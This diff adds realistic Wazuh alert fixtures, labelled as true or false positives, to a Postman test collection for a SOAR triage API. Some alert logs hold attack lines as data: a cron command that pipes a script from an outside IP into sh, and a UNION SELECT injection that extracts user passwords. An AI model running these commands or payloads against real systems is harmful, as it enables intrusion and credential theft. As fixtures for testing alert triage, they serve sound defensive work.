@@ -2,7 +2,7 @@
   "info": {
     "_postman_id": "c9335f53-1139-4cdf-9a87-bd9fcc478129",
     "name": "SIEMantics - Test Scenarios",
-    "description": "Manual/automated test scenarios for the SIEMantics SOAR API. Mirrors scripts/test_requests.sh: covers the mock-engine severity threshold, all 9 suspicious-pattern regexes, IoC extraction, edge cases, labeling and metrics.\n\nRun order matters: folders 1-3 create the alert records that folder 4 labels. Use Collection Runner to execute the whole collection top to bottom, or run folder by folder.\n\nSet the `base_url` and `webhook_token` collection variables (Variables tab) to match your deployment. If WAZUH_WEBHOOK_TOKEN isn't set server-side, `webhook_token` can be left empty.\n\nFolders 4-5 need a logged-in dashboard user: set `ui_username` / `ui_password` - the Login request at the start of folder 4 stores the session cookie in Postman's cookie jar.",
+    "description": "Manual/automated test scenarios for the SIEMantics SOAR API. Mirrors scripts/test_requests.sh: covers the mock-engine severity threshold, all 9 suspicious-pattern regexes, IoC extraction, edge cases, labeling and metrics.\n\nRun order matters: folders 1-3 create the alert records that folder 4 labels. Use Collection Runner to execute the whole collection top to bottom, or run folder by folder.\n\nSet the `base_url` and `webhook_token` collection variables (Variables tab) to match your deployment. If WAZUH_WEBHOOK_TOKEN isn't set server-side, `webhook_token` can be left empty.\n\nFolders 4-5 need a logged-in dashboard user: set `ui_username` / `ui_password` - the Login request at the start of folder 4 stores the session cookie in Postman's cookie jar.\n\nFolder 6 holds realistic alerts in the full Wazuh format from several sources (Linux, web, FIM, vulnerability detector, ClamAV, Suricata, Windows/Sysmon, FortiGate, AWS, Office 365). It is independent of folders 1-5; the expected ground truth is in each request name (-> TP / -> FP).",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -1577,6 +1577,1266 @@
                   "pm.test('sample_size is a number', () => {",
                   "  pm.expect(pm.response.json().sample_size).to.be.a('number');",
                   "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "6. Realistic multi-source Wazuh alerts",
+      "description": "Realistic alerts in the full Wazuh alert format (rule.groups/mitre, agent, manager, decoder, location, data.*) as forwarded by the Wazuh integration. Besides Wazuh's own rules they cover sources that reach Wazuh through its decoders/integrations: web access logs, FIM (syscheck), vulnerability detector, ClamAV, Suricata EVE, Windows Security + Sysmon (eventchannel), FortiGate syslog, AWS CloudTrail and Office 365.\n\nEach request name ends in '-> TP' or '-> FP' = the expected ground truth, for labelling/evaluation. Some are deliberately hard for the rule-based mock engine (e.g. Suricata alerts are always level 3 in Wazuh, an authorized internal scan is level 10), so they show where the LLM adds value. The tests only assert the API contract; the verdict vs. expectation is printed to the Postman console.\n\nAlert IDs, IPs, hashes and rule IDs are sample data (rule IDs follow the Wazuh ruleset where one exists, custom rules use the 100000+ range).",
+      "item": [
+        {
+          "name": "Linux sshd brute force (rule 5763, lvl 10) -> TP",
+          "id": "c4dc0c68-730b-462c-9320-35eb9b533bd9",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791201.100001\",\n  \"timestamp\": \"2026-10-01T14:20:01.512+0000\",\n  \"rule\": {\n    \"id\": \"5763\",\n    \"level\": 10,\n    \"description\": \"sshd: brute force trying to get access to the system. Authentication failed.\",\n    \"groups\": [\n      \"syslog\",\n      \"sshd\",\n      \"authentication_failures\"\n    ],\n    \"firedtimes\": 1,\n    \"frequency\": 8,\n    \"mitre\": {\n      \"id\": [\n        \"T1110\"\n      ],\n      \"tactic\": [\n        \"Credential Access\"\n      ],\n      \"technique\": [\n        \"Brute Force\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"parent\": \"sshd\",\n    \"name\": \"sshd\"\n  },\n  \"location\": \"/var/log/auth.log\",\n  \"data\": {\n    \"srcip\": \"185.220.101.45\",\n    \"srcport\": \"51122\",\n    \"dstuser\": \"root\"\n  },\n  \"full_log\": \"Oct  1 14:20:01 lab-web01 sshd[21877]: Failed password for root from 185.220.101.45 port 51122 ssh2\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Linux sshd login success, internal admin (rule 5715, lvl 3) -> FP",
+          "id": "855552af-c1b8-40e3-8ec8-8705f3405e56",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791202.100002\",\n  \"timestamp\": \"2026-10-01T14:21:12.044+0000\",\n  \"rule\": {\n    \"id\": \"5715\",\n    \"level\": 3,\n    \"description\": \"sshd: authentication success.\",\n    \"groups\": [\n      \"syslog\",\n      \"sshd\",\n      \"authentication_success\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1078\",\n        \"T1021\"\n      ],\n      \"tactic\": [\n        \"Defense Evasion\",\n        \"Lateral Movement\"\n      ],\n      \"technique\": [\n        \"Valid Accounts\",\n        \"Remote Services\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"parent\": \"sshd\",\n    \"name\": \"sshd\"\n  },\n  \"location\": \"/var/log/auth.log\",\n  \"data\": {\n    \"srcip\": \"10.64.0.124\",\n    \"srcport\": \"60412\",\n    \"dstuser\": \"levente\"\n  },\n  \"full_log\": \"Oct  1 14:21:12 lab-web01 sshd[21990]: Accepted publickey for levente from 10.64.0.124 port 60412 ssh2: ED25519 SHA256:q3Vb8m1Yc0kQ4x0bS2l8Q7yZ0w9mJk1p\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: false positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Linux sudo to root by admin (rule 5402, lvl 3) -> FP",
+          "id": "dfc220cf-ed11-4d0a-9cb8-b1a8fed2a850",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791203.100003\",\n  \"timestamp\": \"2026-10-01T14:22:40.300+0000\",\n  \"rule\": {\n    \"id\": \"5402\",\n    \"level\": 3,\n    \"description\": \"Successful sudo to ROOT executed.\",\n    \"groups\": [\n      \"syslog\",\n      \"sudo\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1548.003\"\n      ],\n      \"tactic\": [\n        \"Privilege Escalation\",\n        \"Defense Evasion\"\n      ],\n      \"technique\": [\n        \"Sudo and Sudo Caching\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"sudo\"\n  },\n  \"location\": \"/var/log/auth.log\",\n  \"data\": {\n    \"srcuser\": \"levente\",\n    \"dstuser\": \"root\",\n    \"tty\": \"pts/0\",\n    \"pwd\": \"/home/levente\",\n    \"command\": \"/usr/bin/systemctl restart nginx\"\n  },\n  \"full_log\": \"Oct  1 14:22:40 lab-web01 sudo:  levente : TTY=pts/0 ; PWD=/home/levente ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: false positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Linux reverse shell download via cron (custom rule, lvl 12) -> TP",
+          "id": "e94c92c1-f4c1-4af5-80b2-0e5150b18e62",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791204.100004\",\n  \"timestamp\": \"2026-10-01T14:23:05.871+0000\",\n  \"rule\": {\n    \"id\": \"100210\",\n    \"level\": 12,\n    \"description\": \"Suspicious download-and-execute command in crontab\",\n    \"groups\": [\n      \"local\",\n      \"syslog\",\n      \"cron\",\n      \"attack\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1053.003\",\n        \"T1105\"\n      ],\n      \"tactic\": [\n        \"Persistence\",\n        \"Command and Control\"\n      ],\n      \"technique\": [\n        \"Cron\",\n        \"Ingress Tool Transfer\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"005\",\n    \"name\": \"lab-db01\",\n    \"ip\": \"10.64.0.86\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"cron\"\n  },\n  \"location\": \"/var/log/syslog\",\n  \"data\": {\n    \"srcuser\": \"www-data\"\n  },\n  \"full_log\": \"Oct  1 14:23:05 lab-db01 CRON[3311]: (www-data) CMD (curl http://45.137.21.9/x.sh | sh >/dev/null 2>&1)\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Nginx SQL injection returned 200 (rule 31106, lvl 6) -> TP",
+          "id": "4a521ec6-1c50-4131-948e-d60ba1a5cfa3",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791205.100005\",\n  \"timestamp\": \"2026-10-01T14:24:18.009+0000\",\n  \"rule\": {\n    \"id\": \"31106\",\n    \"level\": 6,\n    \"description\": \"A web attack returned code 200 (success).\",\n    \"groups\": [\n      \"web\",\n      \"accesslog\",\n      \"attack\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1190\"\n      ],\n      \"tactic\": [\n        \"Initial Access\"\n      ],\n      \"technique\": [\n        \"Exploit Public-Facing Application\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"web-accesslog\"\n  },\n  \"location\": \"/var/log/nginx/access.log\",\n  \"data\": {\n    \"protocol\": \"GET\",\n    \"srcip\": \"203.0.113.77\",\n    \"id\": \"200\",\n    \"url\": \"/shop/item.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--\"\n  },\n  \"full_log\": \"203.0.113.77 - - [01/Oct/2026:14:24:18 +0000] \\\"GET /shop/item.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\\\" 200 5123 \\\"-\\\" \\\"sqlmap/1.8.2#stable (https://sqlmap.org)\\\"\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Nginx 404 burst from internal vuln scanner (rule 31151, lvl 10) -> FP",
+          "id": "79b09862-8724-4b7a-a33d-9b230e1148ff",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791206.100006\",\n  \"timestamp\": \"2026-10-01T14:25:30.410+0000\",\n  \"rule\": {\n    \"id\": \"31151\",\n    \"level\": 10,\n    \"description\": \"Multiple web server 400 error codes from same source ip.\",\n    \"groups\": [\n      \"web\",\n      \"accesslog\",\n      \"web_scan\",\n      \"recon\"\n    ],\n    \"frequency\": 14,\n    \"mitre\": {\n      \"id\": [\n        \"T1595.002\"\n      ],\n      \"tactic\": [\n        \"Reconnaissance\"\n      ],\n      \"technique\": [\n        \"Vulnerability Scanning\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"web-accesslog\"\n  },\n  \"location\": \"/var/log/nginx/access.log\",\n  \"data\": {\n    \"protocol\": \"GET\",\n    \"srcip\": \"10.64.0.50\",\n    \"id\": \"404\",\n    \"url\": \"/.git/config\"\n  },\n  \"full_log\": \"10.64.0.50 - - [01/Oct/2026:14:25:30 +0000] \\\"GET /.git/config HTTP/1.1\\\" 404 153 \\\"-\\\" \\\"Mozilla/5.0 (compatible; Nessus SOAP; scheduled-weekly-scan)\\\"\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: false positive (authorized internal scan) - good LLM test, mock says TP."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "FIM: /etc/shadow modified (syscheck rule 550, lvl 7) -> TP",
+          "id": "c92a1a31-495f-4851-98ef-226e5231cae5",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791207.100007\",\n  \"timestamp\": \"2026-10-01T14:26:44.122+0000\",\n  \"rule\": {\n    \"id\": \"550\",\n    \"level\": 7,\n    \"description\": \"Integrity checksum changed.\",\n    \"groups\": [\n      \"ossec\",\n      \"syscheck\",\n      \"syscheck_entry_modified\",\n      \"syscheck_file\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1565.001\"\n      ],\n      \"tactic\": [\n        \"Impact\"\n      ],\n      \"technique\": [\n        \"Stored Data Manipulation\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"005\",\n    \"name\": \"lab-db01\",\n    \"ip\": \"10.64.0.86\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"syscheck_integrity_changed\"\n  },\n  \"location\": \"syscheck\",\n  \"syscheck\": {\n    \"path\": \"/etc/shadow\",\n    \"mode\": \"realtime\",\n    \"event\": \"modified\",\n    \"size_before\": \"1203\",\n    \"size_after\": \"1289\",\n    \"md5_before\": \"5f4dcc3b5aa765d61d8327deb882cf99\",\n    \"md5_after\": \"e99a18c428cb38d5f260853678922e03\",\n    \"uname_after\": \"root\",\n    \"changed_attributes\": [\n      \"size\",\n      \"mtime\",\n      \"md5\",\n      \"sha1\",\n      \"sha256\"\n    ],\n    \"audit\": {\n      \"user\": {\n        \"name\": \"www-data\",\n        \"id\": \"33\"\n      },\n      \"process\": {\n        \"name\": \"/usr/bin/python3\",\n        \"id\": \"4412\"\n      }\n    }\n  },\n  \"full_log\": \"File '/etc/shadow' modified\\nMode: realtime\\nChanged attributes: size,mtime,md5,sha1,sha256\\nSize changed from '1203' to '1289'\\n(Audit) User: 'www-data (33)'\\n(Audit) Process name: '/usr/bin/python3'\\n\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Vulnerability detector: regreSSHion CVE-2024-6387 (lvl 10) -> TP",
+          "id": "3942cbaa-4e09-4dab-8cf1-721cf2357961",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791208.100008\",\n  \"timestamp\": \"2026-10-01T14:27:00.000+0000\",\n  \"rule\": {\n    \"id\": \"23505\",\n    \"level\": 10,\n    \"description\": \"CVE-2024-6387 affects openssh-server\",\n    \"groups\": [\n      \"vulnerability-detector\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"json\"\n  },\n  \"location\": \"vulnerability-detector\",\n  \"data\": {\n    \"vulnerability\": {\n      \"cve\": \"CVE-2024-6387\",\n      \"severity\": \"High\",\n      \"cvss\": {\n        \"cvss3\": {\n          \"base_score\": \"8.100000\"\n        }\n      },\n      \"package\": {\n        \"name\": \"openssh-server\",\n        \"version\": \"1:9.6p1-3ubuntu13\",\n        \"architecture\": \"amd64\",\n        \"condition\": \"Package less than 1:9.6p1-3ubuntu13.3\"\n      },\n      \"title\": \"regreSSHion: Remote Unauthenticated Code Execution in OpenSSH server\",\n      \"status\": \"Active\",\n      \"published\": \"2024-07-01\",\n      \"reference\": \"https://nvd.nist.gov/vuln/detail/CVE-2024-6387\"\n    }\n  },\n  \"full_log\": \"CVE-2024-6387 affects openssh-server (1:9.6p1-3ubuntu13) on agent lab-web01: regreSSHion - signal handler race condition in sshd allows unauthenticated RCE as root (CVSS 8.1).\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive (exposure, not an active attack)."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "ClamAV: Mirai trojan found in /tmp (rule 52502, lvl 8) -> TP",
+          "id": "1a51dae7-6877-4a92-b326-352908caf4db",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791209.100009\",\n  \"timestamp\": \"2026-10-01T14:28:15.733+0000\",\n  \"rule\": {\n    \"id\": \"52502\",\n    \"level\": 8,\n    \"description\": \"ClamAV: Virus detected\",\n    \"groups\": [\n      \"clamd\",\n      \"freshclam\",\n      \"virus\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1204.002\"\n      ],\n      \"tactic\": [\n        \"Execution\"\n      ],\n      \"technique\": [\n        \"Malicious File\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"005\",\n    \"name\": \"lab-db01\",\n    \"ip\": \"10.64.0.86\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"clamd\"\n  },\n  \"location\": \"/var/log/clamav/clamav.log\",\n  \"data\": {\n    \"url\": \"/tmp/.x/kworkerd\",\n    \"extra_data\": \"Unix.Trojan.Mirai-7100807-0\"\n  },\n  \"full_log\": \"Wed Oct  1 14:28:15 2026 -> /tmp/.x/kworkerd: Unix.Trojan.Mirai-7100807-0 FOUND\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
